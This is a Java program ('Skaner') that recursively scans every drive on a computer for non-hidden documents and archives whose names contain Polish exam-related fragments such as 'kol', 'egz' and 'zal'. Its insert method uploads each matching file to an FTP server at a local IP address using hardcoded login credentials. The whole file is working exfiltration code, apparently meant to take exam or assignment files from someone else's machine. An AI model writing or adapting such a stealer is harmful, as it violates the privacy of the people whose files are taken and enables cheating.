/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package skaner;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import org.apache.commons.net.ftp.FTPClient;

public class Skaner {
static List<File> dir = new ArrayList<File>();
static List<File> file = new ArrayList<File>();
static String tab[] = {"kol","zad","kom","egz","zal"};
static public void scanDrive(String name)
{   
    int i=0;
    File[] files = new File(name).listFiles();
    if (files != null )
    {
       for ( File element : files)    
       {   
            if(element.isHidden()==false)
            {   
                if(element.isDirectory()) dir.add(element);
                else file.add(element);
            }
        } 
    }
    try{
        while(i!=dir.size())
        {  
            files = new File(dir.get(i).getPath()).listFiles();
            if (files != null )
            {
                for ( File element : files)
                {   if(element.isHidden()==false)
                    {
                        if(element.isDirectory()) dir.add(element);
                        else file.add(element);
                    }   
                }

            }
            i++;
        }
    }catch(Exception e){}
}
static void findFile()
{
    for(int i=0;i<file.size();i++)
        {   for(int j=0; j<tab.length;j++)
            {
                if(file.get(i).getName().contains(tab[j]) && (file.get(i).getName().endsWith(".tex") 
                                                          ||  file.get(i).getName().endsWith(".txt")
                                                          ||  file.get(i).getName().endsWith(".pdf")
                                                          ||  file.get(i).getName().endsWith(".doc")
                                                          ||  file.get(i).getName().endsWith(".rtf")
                                                          ||  file.get(i).getName().endsWith(".zip")
                                                          ||  file.get(i).getName().endsWith(".rar")))
                {   
                    insert(file.get(i).toString(),file.get(i).getName().toString());
                    System.out.println(file.get(i));
                }
            }
        }
}
static void findLetters()
{
    File[] roots = File.listRoots();
    for(int i = 0; i < roots.length ; i++)
    {
        scanDrive(roots[i].getPath());
        findFile();
        dir.clear();
        file.clear();
    }
    
}
static void insert(String path, String name)
{
    FTPClient client = new FTPClient();
    FileInputStream fis = null;

    try {
        client.connect("192.168.0.104",21);
        client.login("FTP-User", "Banan1995");

        fis = new FileInputStream(path);

        client.storeFile(name, fis);
        client.logout();
    } catch (IOException e) {
        e.printStackTrace();
    } finally {
        try {
            if (fis != null) {
                fis.close();
            }
            client.disconnect();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
    public static void main(String[] args) throws FileNotFoundException {
    
         findLetters();
         
       
    }
}
